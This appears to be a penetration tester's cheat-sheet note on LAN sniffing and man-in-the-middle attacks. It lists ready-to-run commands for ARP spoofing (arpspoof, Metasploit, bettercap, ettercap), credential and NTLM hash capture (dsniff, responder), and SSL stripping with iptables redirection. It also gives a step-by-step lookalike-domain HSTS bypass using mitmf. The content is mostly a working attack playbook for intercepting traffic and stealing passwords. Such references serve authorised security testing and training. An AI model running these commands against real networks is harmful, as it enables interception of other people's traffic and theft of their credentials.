# Sniffing
## $ tcpdump
```bash
$ tcpdump
```
# (OSI/ISO 2 Layer - Data Link)

## $ arpspoof (spoof)
**arpspoof** redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.  
https://www.geeksforgeeks.org/ssl-stripping-and-arp-spoofing-in-kali-linux/
```bash
$ arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
```

![[tools/arpspoof#MitM]]

## $ msf>arp_poisoning (spoof)

```bash
msf> auxiliary/spoof/arp/arp_poisoning
set DHOSTS *IP address of the attacked system*
set SHOSTS *IP address of the gateway*
```

## $ bettercap (spoof + sniff)
```bash
$ bettercap [-I eth0] # default spoofing attack against all hosts
$ bettercap [-I eth0] --no-spoofing # discovery devices in network, network sniffing, Mitm attack 
$ bettercap [-I eth0] -T <target_IP> # ARP spoofing attack against host, MitM attack
$ bettercap [-I eth0] -X  -T <target_IP> -G <gateway_IP># default spoofing attack against all hosts with sniffing, Mitm attack
```

## $ ettercap (spoof + sniff)

```bash
$ ettercap -G # run ettercap, graphic mode
$ ettercap -T -M [-i eth0] [-L </tmp/logfile>] <IP1> [<IP2>] # MitM attack and sniff connection
```

#  (OSI/ISO 3 Layer - Network)
## $ dsniff (password sniff)
When MitM (`$ apr-spoof...`) attack is running it sniffs for creds, etc. 
```bash
$ dsniff -i <interface> 
```

## $ responder (NTLMv1/NTLMv2 sniff)
**LLMNR** - Link-Local Multicast Name Resolution (succesor of **NBT-NS** - NetBIOS Name Service). 
They allow for machines within a Windows-based network to find one another and is essentially a “fall-back” protocol used for the resolution of hostnames within a network when resolving of hostnames via DNS fails.
![[tools/responder]]

## $ Cain&Abel
Graphical tool for windows.
# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

# SSL Trafic stripping

## $ sslstrip
The way sslstrip works is as follows:
1. Performs a MITM attack on the HTTPS connection between the victim and the server
2. Replaces the HTTPS links with HTTP clone links and remembers the links which were changed 
3. Communicates with the victim client over HTTP connections for any secure link 
4. Communicates with the legitimate server over HTTPS for the same secure link
5. The sslstip attacker machine transparently proxies the communications between the victim and the server 
6. Favicon images are replaced with the known "secure lock" icon to provide familiar visual confirmations 
7. Sslstrip logs all traffic passing through so passwords, credentials etc. are stolen without the victim knowing
```bash
# enable IP forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward

# set up port redirection iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080
$ sslstrip -a -f -l 8080 -w els_sslt 
# -w file to write - logs
# -l - port to listen on
# -f - favicon
# -a - log all SSL and HTTP trafic
```

## $ bettercap
`bettercap` already implements sslstrip, to runsslstrip:
```bash
$ bettercap -T <target_IP> -G <gateway_IP> --prox-https # MitM attack with sslstrip enabled
```

# HSTS bypass
The following summarizes the attack in action: 
1. The victim goes to google.com (not in the HSTS preload list) 
2. We (attacker) intercept the traffic and change the links in the web page. For example we change accounts.google.com to acccounts.google.com (notice the three 'ccc') 
3. The victim makes a DNS request for the domain acccounts.google.com 
4. We intercept the request, forward the real DNS request and respond to the victim with a fake domain and the IP address
5. The victim web browser will now search if the domain should be accessed securely (HTTPS). This can be done by checking the HSTS preloaded list or by checking if the domain has already been visited, and then has the HSTS header already set (and not expired). 
6. Since the domain is different (it is acccounts with three 'c'), the browser will continue the communication via HTTP.
## $ mitmf

```bash
$ python mitmf.py -i eth0 --spoof --arp --dns --hsts --gateway <IP> --targets <IP1> [<IP2>]
```